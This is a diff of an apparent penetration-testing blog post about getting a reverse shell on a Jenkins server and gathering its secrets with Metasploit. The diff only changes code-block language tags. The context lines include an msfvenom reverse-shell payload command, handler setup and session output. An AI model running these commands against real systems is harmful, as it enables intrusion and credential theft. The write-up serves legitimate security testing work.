@@ -15,7 +15,7 @@ The general method is outlined in the [documentation for the script](https://git
 On my most recent encounter with this, the `jenkins_script_console` module refused to work for some reason.
 
 Instead of using the typical `jenkins_script_console` script, instead I prepared a reverse shell payload myself, using Metasploit's `msfvenom`.
-```sh
+```shell
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.3 LPORT=4444 -f elf -o /tmp/payload.bin
 ```
 
@@ -23,7 +23,7 @@ I then uploaded payload.bin to my web-server, to be downloaded later on on the J
 
 Back on my host, I run `msfconsole`, and use the following:
 
-```sh
+```ruby
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set PAYLOAD linux/x86/shell_reverse_tcp
@@ -43,7 +43,7 @@ On the Jenkins instance, I ran the following groovy code:
 ```
 
 The connection with the Metasploit module is made, we background the session, and then we use the jenkins_gather 
-```sh
+```ruby
 [*] Command shell session 1 opened (10.0.0.3:4444 -> 10.0.0.4:27468) at 2023-02-22 01:10:28 +0000
 
 ^Z
@@ -66,8 +66,8 @@ On this server, the `find` command was taking over two minutes, and even though 
 
 I made a patch to add an optional variable that instructs the module to use a specific directory for the secrets, [metasploit-framework/pull/17681](https://github.com/rapid7/metasploit-framework/pull/17681).
 
-Then, I ran into more trouble:sh
-```
+Then, I ran into more trouble:
+```ruby
 [-] Post failed: NoMethodError undefined method `empty?' for nil:NilClass
 [-] Call stack:
 [-]   /opt/metasploit-framework/embedded/framework/modules/post/multi/gather/jenkins_gather.rb:235:in `block in pretty_print_gathered'
